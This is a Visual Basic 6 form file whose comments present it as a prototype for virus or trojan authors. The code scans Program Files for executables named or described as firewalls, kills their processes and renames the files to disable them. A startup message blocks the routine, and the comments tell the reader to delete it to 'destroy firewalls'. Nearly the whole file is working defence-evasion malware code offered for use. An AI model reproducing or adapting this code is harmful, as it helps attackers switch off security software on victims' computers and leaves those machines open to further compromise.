VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "Form1"
   ClientHeight    =   1185
   ClientLeft      =   60
   ClientTop       =   405
   ClientWidth     =   6330
   LinkTopic       =   "Form1"
   ScaleHeight     =   1185
   ScaleWidth      =   6330
   StartUpPosition =   3  'Windows Default
   Begin VB.Label Label1 
      BackColor       =   &H00FF8080&
      Caption         =   "Check The Code and Explanations"
      BeginProperty Font 
         Name            =   "Vrinda"
         Size            =   18
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   495
      Left            =   240
      TabIndex        =   0
      Top             =   360
      Width           =   5655
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'This is a prototype example that how can you find and delete antivirus and firewall apps if you are making
'a virus or trojan etc. check for internet (if you cannot connect then use these modules to defeat most firewalls)
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)





'Explanation: the code finds executables from program files and check their info and name for firewall word. If
'found , it terminates the app and renames it.


Sub DESTROYFIREWALL()
FindFiles Environ("PROGRAMFILES"), "*.*"
End Sub



'FindFiles Callback
Sub Process(File As String)
Dim V As String, T As String, C As String, D As String, i As Long

'Detect firewall reading executables
If Right(File, 3) = "exe" Then
GetVersionInfo File, V, T, C, D
'If There's Firewall in any string
If InStr(1, D, "Firewall", vbTextCompare) > 0 Or InStr(1, File, "Firewall", vbTextCompare) > 0 Then
'Try To Kill Firewall Process 20 times max
Do While isProcess(Remext(File)) = True Or i > 20
KillProcess (Remext(File))
i = i + 1
Loop
If isProcess(Remext(File)) = False Then
'Destroy it
Sleep 1000
Name File As File & ".bak"
Else
'Firewall Cant be terminated and it is protected from termination
End If
End If
End If
End Sub

Private Sub Form_Load()
MsgBox "You Cannot Run This Code In Your Computer. See The Code And Remove This Message To Destroy Firewalls(if any);"
End
'Main Routine
DESTROYFIREWALL
End Sub
